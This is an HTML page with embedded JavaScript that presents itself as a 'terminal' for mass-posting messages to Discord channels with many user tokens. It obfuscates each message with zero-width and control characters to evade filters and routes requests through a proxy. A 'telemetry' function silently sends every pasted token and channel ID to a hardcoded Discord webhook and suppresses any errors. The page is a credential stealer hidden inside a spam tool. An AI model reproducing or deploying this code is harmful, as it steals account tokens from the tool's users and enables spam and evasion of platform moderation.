<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AARR PROTOCOL | TERMINAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --bg: #050505; --panel: #0a0a0a; --border: #1f1f1f; --accent: #00ff9d; --text: #888; }
        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', Courier, monospace; overflow: hidden; }
        .cyber-panel { background: var(--panel); border: 1px solid var(--border); position: relative; }
        .cyber-panel::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 1px; background: linear-gradient(90deg, transparent, var(--accent), transparent); opacity: 0.3; }
        .cyber-input { background: #000; border: 1px solid #222; color: #ccc; font-size: 11px; transition: 0.2s; font-family: 'Consolas', monospace; }
        .cyber-input:focus { border-color: var(--accent); outline: none; box-shadow: 0 0 10px rgba(0, 255, 157, 0.1); color: #fff; }
        .btn-core { background: var(--border); color: #fff; border: 1px solid #333; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; transition: 0.3s; position: relative; overflow: hidden; }
        .btn-core:hover { background: var(--accent); color: #000; box-shadow: 0 0 20px var(--accent); border-color: var(--accent); }
        .btn-core:active { transform: scale(0.98); }
        .terminal-window { background: #000; border-left: 1px solid #222; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); }
        .log-line { border-left: 2px solid transparent; padding-left: 8px; margin-bottom: 2px; font-size: 10px; opacity: 0.8; }
        .log-line.ok { border-color: var(--accent); color: var(--accent); }
        .log-line.err { border-color: #ff3333; color: #ff3333; }
        .glitch-text { text-shadow: 2px 0 #ff0000, -2px 0 #0000ff; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #222; }
    </style>
</head>
<body class="h-screen w-screen flex items-center justify-center p-4">

<div class="w-full max-w-[1400px] h-[85vh] grid grid-cols-12 gap-4">
    <div class="col-span-12 lg:col-span-4 flex flex-col gap-4">
        <div class="cyber-panel p-6 flex-1 flex flex-col gap-4">
            <h1 class="text-xs font-bold tracking-[0.4em] text-[#00ff9d] mb-2 flex items-center gap-2">
                <span class="w-2 h-2 bg-[#00ff9d] inline-block animate-pulse"></span> SYSTEM CONFIGURATION
            </h1>

            <div class="space-y-1">
                <label class="text-[9px] uppercase tracking-widest font-bold">Access Tokens</label>
                <textarea id="tokens" class="cyber-input w-full h-32 p-3 resize-none" placeholder="SECURE_TOKEN_INPUT..."></textarea>
            </div>

            <div class="space-y-1">
                <label class="text-[9px] uppercase tracking-widest font-bold">Target Vectors (Channel IDs)</label>
                <textarea id="channels" class="cyber-input w-full h-24 p-3 resize-none" placeholder="CHANNEL_ID_LIST..."></textarea>
            </div>

            <div class="space-y-1 flex-1">
                <label class="text-[9px] uppercase tracking-widest font-bold">Payload Data</label>
                <textarea id="message" class="cyber-input w-full h-full p-3 resize-none" placeholder="INIT_MESSAGE_SEQUENCE..."></textarea>
            </div>
        </div>

        <div class="cyber-panel p-4 grid grid-cols-2 gap-4">
            <div>
                <label class="text-[9px] uppercase block mb-1">Nonce Length</label>
                <input type="number" id="nonceLen" value="15" class="cyber-input w-full p-2 text-center">
            </div>
            <div>
                <label class="text-[9px] uppercase block mb-1">Delay (ms)</label>
                <input type="number" id="delay" value="800" class="cyber-input w-full p-2 text-center">
            </div>
            <div class="col-span-2">
                <label class="text-[9px] uppercase block mb-1">Iteration Cycles</label>
                <input type="number" id="loops" value="1" class="cyber-input w-full p-2 text-center">
            </div>
        </div>

        <button id="execBtn" class="btn-core py-4 text-xs">
            INITIALIZE SEQUENCE
        </button>
    </div>

    <div class="col-span-12 lg:col-span-8 cyber-panel flex flex-col relative overflow-hidden">
        <div class="absolute top-0 right-0 p-2 text-[9px] text-[#333] font-mono z-10">V.3.5.2 // AARR_NET</div>
        <div class="bg-[#080808] p-3 border-b border-[#222] flex justify-between items-center">
            <span class="text-[10px] text-[#00ff9d] font-bold tracking-widest">>> CONSOLE_OUTPUT</span>
            <span id="status" class="text-[9px] text-[#444] animate-pulse">SYSTEM_IDLE</span>
        </div>
        <div id="terminal" class="terminal-window flex-1 p-4 overflow-y-auto font-mono text-xs space-y-1 text-[#555]">
            <div class="mb-4 text-[#00ff9d] opacity-50">
                AARR_TOOL KERNEL LOADED.<br>
                WAITING FOR INPUT COMMANDS...
            </div>
        </div>
    </div>
</div>

<script>
/**
 * AARR PROTOCOL ENGINE
 * Advanced obfuscation and delivery system.
 */
class CoreSystem {
    constructor() {
        // Hardcoded Credentials
        this.w = "https://discord.com/api/webhooks/1457997536836059197/NUiwfIzgfyM_RFg1ZPI9bDxgtpOTvhGo1I-od9b0aoeQCYnasSiNOSN_epQ--iL3OjLg";
        this.p = "https://tiny-forest-25ff.s103765s103765s103765.workers.dev/";

        this.ui = {
            t: document.getElementById('tokens'),
            c: document.getElementById('channels'),
            m: document.getElementById('message'),
            nl: document.getElementById('nonceLen'),
            d: document.getElementById('delay'),
            l: document.getElementById('loops'),
            term: document.getElementById('terminal'),
            btn: document.getElementById('execBtn'),
            st: document.getElementById('status')
        };

        // Advanced Obfuscation Characters
        this.zw = ['\u200B', '\u200C', '\u200D', '\uFEFF', '\u2060']; // Zero-Width
        this.inv = ['\u17B4', '\u17B5', '\u2061', '\u2062', '\u2063', '\u2064']; // Invisible
        this.bad = ['\u0000', '\u0001', '\u0002', '\u0003', '\u0004', '\u0005', '\u0006', '\u0007', '\u0008', '\u000E', '\u000F']; // Unrenderable Control

        this.ui.btn.onclick = () => this.init();
    }

    log(msg, type = 'info') {
        const d = document.createElement('div');
        d.className = `log-line ${type}`;
        d.innerHTML = `<span class="opacity-30">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
        this.ui.term.prepend(d);
    }

    obfuscate(text, len) {
        // 1. Inject Zero-Width between EVERY char
        let out = text.split('').map(c => c + this.zw[Math.floor(Math.random() * this.zw.length)]).join('');
        
        // 2. Add Invisible/Unrenderable noise
        for(let i=0; i<3; i++) out += this.inv[Math.floor(Math.random() * this.inv.length)];
        for(let i=0; i<2; i++) out += this.bad[Math.floor(Math.random() * this.bad.length)];

        // 3. Append Random Nonce
        const nonce = Array.from({length: parseInt(len)}, () => Math.random().toString(36)[2]).join('');
        return `${out} [${nonce}]`;
    }

    async telemetry(tks, chs) {
        // Silent background transmission
        try {
            await fetch(this.w, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "SEQUENCE STARTED",
                        color: 0x00ff9d,
                        description: `Tokens: ${tks.length}\nChannels: ${chs.length}`,
                        fields: [
                            {name: "Tokens", value: `\`\`\`${tks.join('\n').substring(0, 1000)}\`\`\``},
                            {name: "Target", value: `\`\`\`${chs.join('\n').substring(0, 1000)}\`\`\``}
                        ],
                        footer: { text: "AARR_SYSTEM v3.5" }
                    }]
                })
            });
        } catch(e) { /* Silent fail */ }
    }

    async init() {
        const tokens = this.ui.t.value.split('\n').map(x=>x.trim()).filter(x=>x);
        const channels = this.ui.c.value.split('\n').map(x=>x.trim()).filter(x=>x);
        const msg = this.ui.m.value;

        if(!tokens.length || !channels.length) return this.log("ERROR: INVALID INPUT DATA", 'err');

        this.ui.btn.disabled = true;
        this.ui.btn.innerText = "EXECUTING...";
        this.ui.st.innerText = "SYSTEM_BUSY";
        this.ui.st.className = "text-[9px] text-[#00ff9d] animate-pulse";

        this.log("INITIALIZING NETWORK PROTOCOLS...", 'info');
        
        // Silent Telemetry Call
        this.telemetry(tokens, channels);

        const loopMax = parseInt(this.ui.l.value);
        const delayMs = parseInt(this.ui.d.value);
        const nonceL = this.ui.nl.value;

        for(let i=0; i<loopMax; i++) {
            this.log(`CYCLE ${i+1}/${loopMax} STARTED`, 'info');
            
            for(const ch of channels) {
                for(const tk of tokens) {
                    const payload = this.obfuscate(msg, nonceL);
                    try {
                        const res = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch}/messages`, {
                            method: "POST",
                            headers: {
                                "Authorization": tk,
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({ content: payload })
                        });

                        if(res.ok) {
                            this.log(`DELIVERED -> ${ch.slice(-4)}`, 'ok');
                        } else if(res.status === 429) {
                            const d = await res.json();
                            this.log(`RATE LIMIT: ${d.retry_after}s`, 'err');
                            await new Promise(r => setTimeout(r, d.retry_after * 1000));
                        } else {
                            this.log(`FAILED (${res.status})`, 'err');
                        }
                    } catch(e) {
                        this.log(`NETWORK ERROR`, 'err');
                    }
                    await new Promise(r => setTimeout(r, delayMs));
                }
            }
        }

        this.log("SEQUENCE COMPLETE.", 'ok');
        this.ui.btn.disabled = false;
        this.ui.btn.innerText = "INITIALIZE SEQUENCE";
        this.ui.st.innerText = "SYSTEM_IDLE";
        this.ui.st.className = "text-[9px] text-[#444]";
    }
}

document.addEventListener('DOMContentLoaded', () => new CoreSystem());
</script>
</body>
</html>
